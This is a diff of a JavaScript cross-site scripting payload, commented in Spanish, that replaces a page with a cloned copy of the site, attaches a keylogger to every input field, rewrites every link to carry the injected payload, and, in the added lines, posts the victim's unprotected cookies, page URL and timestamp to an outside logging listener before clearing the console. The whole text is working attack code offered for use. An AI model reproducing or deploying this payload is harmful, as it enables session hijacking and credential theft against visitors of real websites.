@@ -7,7 +7,7 @@ document.body.innerHTML = '';
 var newUrl = window.location.href.replace(/\lang.*\)/i,'lang=ES-ES');
 history.pushState({ path: newUrl }, '', newUrl);
 
-//Todo esto clona la web original
+//Clona la web original
 fetch(newUrl)
     .then(response => { return response.text() })
     .then(html => {
@@ -16,7 +16,7 @@ fetch(newUrl)
         document.body.innerHTML = doc.body.innerHTML;
         document.head.innerHTML = doc.head.innerHTML;
     }).then(() => {
-        //Finalmente agregamos el keylogger
+        //Finalmente agrega el keylogger
         var inputs = document.querySelectorAll('input');
         inputs.forEach(i => {
             i.addEventListener("blur", (event) => {
@@ -25,13 +25,17 @@ fetch(newUrl)
                 })
             })
         });
-        // Envenenamos los links
+        // Envenena los links
         var links = document.querySelectorAll('a');
         links.forEach(a => {
             let l_url = new URL(a.href)
             l_url.searchParams.set(param_vuln, payload_vuln)
             a.setAttribute('href',l_url.href)
         });
+        // Envía las cookies que no estén protegidas
+        fetch(https_listener_for_logging, {
+                    method: "POST", body: JSON.stringify({ "cookies": document.cookie, 'url': document.baseURI, "timestamp": Date.now() }),
+                })
         console.clear();
     })
     .catch();
